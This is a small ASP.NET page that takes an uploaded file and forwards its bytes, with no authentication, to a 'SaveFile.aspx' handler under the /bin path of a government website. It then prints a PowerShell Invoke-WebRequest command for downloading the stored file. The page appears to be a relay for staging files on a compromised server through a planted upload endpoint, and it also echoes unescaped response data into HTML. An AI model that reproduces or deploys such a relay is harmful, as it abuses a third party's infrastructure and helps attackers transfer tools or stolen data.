<%@ Page Language="C#" %>
<!DOCTYPE html>
<html>
<head>
    <title>File Upload</title>
</head>
<body>
    <h2>Upload File</h2>
    <form id="uploadForm" method="post" enctype="multipart/form-data" runat="server">
        <input type="file" name="fileUploader" id="fileUploader" />
        <input type="submit" value="Upload" />
    </form>

    <div>
        <% 
        if (IsPostBack && Request.Files.Count > 0) 
        {
            try 
            {
                var file = Request.Files["fileUploader"];
                if (file != null && file.ContentLength > 0) 
                {
                    byte[] fileData = new byte[file.ContentLength];
                    file.InputStream.Read(fileData, 0, file.ContentLength);

                    string saveFileUrl = "https://thanhhoa.gov.vn/bin/SaveFile.aspx";

                    using (var client = new System.Net.WebClient()) 
                    {
                        client.Headers.Add("Content-Type", "application/octet-stream");
                        byte[] responseBytes = client.UploadData(saveFileUrl, fileData);

                        string uploadedFileUrl = System.Text.Encoding.UTF8.GetString(responseBytes);

                        Response.Write("<br /><b>File Uploaded Successfully!</b><br />");
                        Response.Write("<a href='" + uploadedFileUrl + "' target='_blank'>Download File</a><br />");
                        Response.Write("<br /><b>PowerShell Command:</b><br />");
                        Response.Write("Invoke-WebRequest -Uri \"" + uploadedFileUrl + "\" -OutFile \"./" + file.FileName + "\"");
                    }
                }
                else 
                {
                    Response.Write("<br />Please select a file to upload.");
                }
            }
            catch (Exception ex) 
            {
                Response.Write("<br />Error: " + ex.Message);
            }
        }
        %>
    </div>
</body>
</html>
